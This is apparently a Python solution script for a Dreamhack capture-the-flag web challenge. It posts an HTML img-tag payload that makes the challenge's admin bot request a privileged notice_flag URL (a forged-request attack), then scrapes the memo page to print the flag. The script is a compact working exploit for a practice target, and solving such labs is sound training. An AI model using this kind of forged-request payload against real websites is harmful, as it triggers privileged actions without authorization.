from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:17404"
FLAG_URI = "/flag"
MEMO_URI = "/memo"
NOTICE_FLAG = '<img src="/admin/notice_flag?userid=admin">'

PAYLOAD = {'param': NOTICE_FLAG}

# 1. Execute Payload and Get Flag
requests.post(URL + FLAG_URI, data=PAYLOAD)

#2. Print Flag
resp = requests.get(URL + MEMO_URI)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0]
print(flag)